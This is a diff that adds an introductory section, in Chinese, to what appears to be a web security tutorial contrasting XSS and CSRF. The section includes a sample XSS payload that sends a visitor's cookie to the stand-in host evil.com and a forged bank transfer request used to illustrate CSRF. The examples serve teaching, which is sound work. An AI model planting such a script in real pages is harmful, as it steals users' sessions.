@@ -4,6 +4,26 @@
 
 ---
 
+## 引子：两个亿级用户网站，都被同样的"低级漏洞"打穿
+
+```text
+案例 1（XSS）：某社交网站评论区，渲染用户输入时没用转义：
+  <div>{{ user.comment }}</div>
+用户输入：<script>document.location='evil.com/?c='+document.cookie</script>
+→ 任何人点开这条评论都被盗 cookie
+
+案例 2（CSRF）：某银行网站转账接口：
+  POST /transfer?to=attacker&amount=10000
+用户在钓鱼邮件点了链接，浏览器**自动带 cookie** 发请求 → 钱被转走
+```
+
+两种攻击**方向相反**：
+
+- **XSS**：别人**利用你**的网站去攻击**你的用户**
+- **CSRF**：别人**利用你的用户**去攻击**你的网站**
+
+**一句话记忆**：XSS 防"内容"，CSRF 防"请求"。
+
 ## 一、核心原理
 
 ### XSS（Cross-Site Scripting）
